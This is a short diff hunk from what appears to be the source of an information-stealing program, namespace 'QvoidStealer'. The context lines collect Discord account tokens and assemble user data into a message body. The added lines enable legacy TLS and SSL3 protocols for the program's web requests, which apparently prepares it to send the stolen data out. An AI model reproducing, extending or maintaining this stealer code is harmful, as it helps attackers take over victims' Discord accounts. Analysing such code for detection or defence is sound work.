@@ -202,6 +202,13 @@ namespace QvoidStealer.Main
 
             Tokens.AddRange(discord.GetTokens());
 
+            
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls
+                                                  | SecurityProtocolType.Tls11
+                                                  | SecurityProtocolType.Tls12
+                                                  | SecurityProtocolType.Ssl3;
+            
             Dictionary<DiscordEmbed, DiscordClient> Users = new Dictionary<DiscordEmbed, DiscordClient>();
             List<string> clientsData = new List<string>();
             string BodyMessage = "";
